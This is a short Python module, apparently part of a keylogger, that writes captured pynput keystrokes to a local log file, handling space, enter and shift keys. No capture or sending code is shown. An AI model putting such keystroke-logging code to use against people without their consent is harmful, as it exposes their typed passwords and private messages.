from typing import List
from os.path import exists
from pynput.keyboard import Key


def report_to_file(keys: List, file_name='log.txt'):
    """Reports keys to local file."""
    write_mode = 'w'

    # Append to log.txt else create one
    if exists('log.txt'):
        write_mode = 'a'

    with open(file_name, write_mode) as f_obj:
        for key in keys:

            if key == Key.space:
                f_obj.write(" ")

            elif key == Key.enter:
                f_obj.write("\n")

            elif key in (Key.shift, Key.shift_r, Key.shift_l):
                pass

            else:
                k = str(key).replace("'", "")
                f_obj.write(k)